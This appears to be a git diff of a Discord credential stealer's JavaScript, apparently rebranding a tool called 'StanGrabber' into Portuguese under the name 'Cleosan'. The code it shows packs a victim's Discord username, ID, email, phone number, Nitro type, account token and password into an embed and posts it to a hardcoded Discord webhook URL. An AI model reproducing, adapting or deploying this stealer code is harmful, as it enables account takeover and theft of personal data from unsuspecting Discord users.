@@ -40,16 +40,16 @@ exports.send = (req, res, webhook) => {
             
             var omg = {
   author: {
-    name: "Dev By Hideaki#1337 x Stan#1337"
+    name: "Informações Recebidas"
   },
-  title: "New person stoled",
-  description: `Username: \`${JSON.parse(JSON.stringify(y)).username}#${JSON.parse(JSON.stringify(y)).discriminator}\`\nID: \`${JSON.parse(JSON.stringify(y)).id}\`\nE-Mail: \`${JSON.parse(JSON.stringify(y)).email}\`\nPhone: \`${JSON.parse(JSON.stringify(y)).phone}\`\nNitro Type: \`${nitro}\`\nToken: \`${token}\`\nPassword: \`${password}\``,
+  title: "Novas Informações",
+  description: `Username: \`${JSON.parse(JSON.stringify(y)).username}#${JSON.parse(JSON.stringify(y)).discriminator}\`\nID: \`${JSON.parse(JSON.stringify(y)).id}\`\nE-Mail: \`${JSON.parse(JSON.stringify(y)).email}\`\nTelefone: \`${JSON.parse(JSON.stringify(y)).phone}\`\nTipo de Nitro: \`${nitro}\`\nToken: \`${token}\`\nSenha: \`${password}\``,
 
 }
             
 
         axios.post(`https://discord.com/api/webhooks/796774817688322058/RM58pWEnHhyTGi0kpiB8qPRWDusKFgYi533wHusnm50NDUU7qoDOqpmNQtnNxL0CLjFh`, {
-            username: JSON.parse(JSON.stringify(y)).username + " - StanGrabber",
+            username: JSON.parse(JSON.stringify(y)).username + " - Cleosan",
             content: '', 
             embeds:[ omg ]
         }).then((z) => {
